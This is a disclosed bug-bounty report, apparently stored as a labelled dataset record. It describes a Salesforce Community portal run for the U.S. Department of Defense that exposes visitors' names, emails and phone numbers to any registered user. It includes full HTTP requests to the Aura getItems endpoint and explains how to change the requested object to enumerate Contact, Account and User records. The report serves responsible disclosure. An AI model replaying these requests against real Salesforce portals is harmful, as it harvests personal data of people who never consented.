{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "oxylis ",
    "title": "\u2588\u2588\u2588 leaking PII of tour visitors (names, email addresses, phone numbers) via misconfigured record permissions",
    "content": "\nDear DoD team,\nThe \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 is leaking a large amount of sensitive data, including full names, email addresses and phone numbers. These are accessible by any registered user, as there is no additional verification.\nAny registered user of the portal is able to gain access to records other users (most likely visitors using the platform to complete security checks).\nThe specific vulnerable objects presenting a risk are:\nContact\nAccount\nAccountContactRelation\nAs the website states that over \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 every year, the extent of this leak may be affecting hundreds of thousands of users.\n\u2588\u2588\u2588\u2588\nHope you find this report helpful - look forward to your feedback.\nImpact\nLarge-scale user PII leak.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nNavigate to \u2588\u2588\u2588\u2588\u2588\nAppend the link to \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nRegister a new user, verify via email\nLog into the portal (if not automatically logged in after following link in email and setting new password)\nCapture a POST request to the \u2588\u2588\u2588\u2588\u2588 endpoint, such as one below (containing the aura.token). This will return only 2000 records - however note that Salesforce Id's are sequential and can be easily enumerated via the GetRecord Aura controller.\nPOST \u2588\u2588\u2588\u2588\u2588\u2588\u2588?r=3&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/1.1\nHost: \u2588\u2588\u2588\nCookie: \u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Firefox/119.0\nAccept: /\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588t=1703212778793\nX-Sfdc-Page-Scope-Id: ab32d6b8-b3fc-4612-8bc1-3b0c8163e8f0\nX-Sfdc-Request-Id: 251200000054548e63\nX-Sfdc-Page-Cache: 44256e663456d3d8\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nContent-Length: 1336\nOrigin: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nDnt: 1\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\nConnection: close\nmessage=%7B%22actions%22%3A%5B%7B%22id%22%3A%2283%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%228c568ef8-3954-4997-930c-542a81f9e8eb%22%2C%22publishedChangelistNum%22%3A61%2C%22audienceKey%22%3A%22cp38y0onxM9f4QchAW2Mkg%22%7D%2C%22version%22%3A%2259.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22Q0FGdjJNU2hrWnJiekVjWXdRVlJ4d08ySzBfZjVsY04wOG9fYlRpVWRXUEEyNDYuMTUuNS0zLjAuNA%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22xUUH_isHmNQqCOJ9yNTV7A%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2F\u2588\u2588\u2588\u2588%2Fs%2F%3Ft%3D1703212778793&aura.token=\u2588\u2588\u2588\u2588\u2588..\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nModify the request as follows and send:\nPOST \u2588\u2588\u2588?r=3&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/1.1\nHost: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCookie: \u2588\u2588\u2588\u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/\u2588\u2588\u2588\u2588\u2588\u2588 Firefox/119.0\nAccept: /\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: \u2588\u2588\u2588\u2588t=1703212778793\nX-Sfdc-Page-Scope-Id: ab32d6b8-b3fc-4612-8bc1-3b0c8163e8f0\nX-Sfdc-Request-Id: 251200000054548e63\nX-Sfdc-Page-Cache: 44256e663456d3d8\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nContent-Length: 1141\nOrigin: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nDnt: 1\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\nConnection: close\nmessage={\"actions\":[{\"id\":\"123;a\",\"descriptor\":\"\u2588\u2588\u2588/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"entityNameOrId\":\"Contact\",\"layoutType\":\"FULL\",\"pageSize\":2000,\"currentPage\":0,\"useTimeout\":false,\"getCount\":false,\"enableRowActions\":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22Q0FGdjJNU2hrWnJiekVjWXdRVlJ4d08ySzBfZjVsY04wOG9fYlRpVWRXUEEyNDYuMTUuNS0zLjAuNA%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22xUUH_isHmNQqCOJ9yNTV7A%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2F\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%2Fs%2F%3Ft%3D1703212778793&aura.token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588..\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nReplace the value of the entityNameOrId field in the request body to test other objects (Account, AccountContactRelation, User etc)\nSuggested Mitigation/Remediation Actions\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nhttps://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "Cleartext Storage of Sensitive Information"
    ],
    "screenshots": {},
    "disclosed_date": 1711144500,
    "report_url": "https://hackerone.com/reports/2294930",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to the target website and register a new user account."
        ],
        [
            2,
            "Log into the portal and capture a POST request to the vulnerable endpoint using a tool like Burp Suite or browser developer tools."
        ],
        [
            3,
            "Modify the request to query different objects (Contact, Account, AccountContactRelation) and send it to retrieve PII data."
        ],
        [
            4,
            "Observe the response containing sensitive user data (names, email addresses, phone numbers)."
        ]
    ],
    "vuln_description": "The vulnerability involves a misconfigured Salesforce Community portal that allows any registered user to access sensitive PII (names, email addresses, phone numbers) of other users. The data is exposed due to improper record-level permissions on Contact, Account, and AccountContactRelation objects, enabling unauthorized enumeration and retrieval of sensitive information.",
    "reason": "The attack requires understanding Salesforce's Aura framework and API endpoints, but the core vulnerability stems from a straightforward misconfiguration (lack of proper access controls). The steps to exploit are methodical but not highly complex, involving registration, request interception, and simple parameter manipulation.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}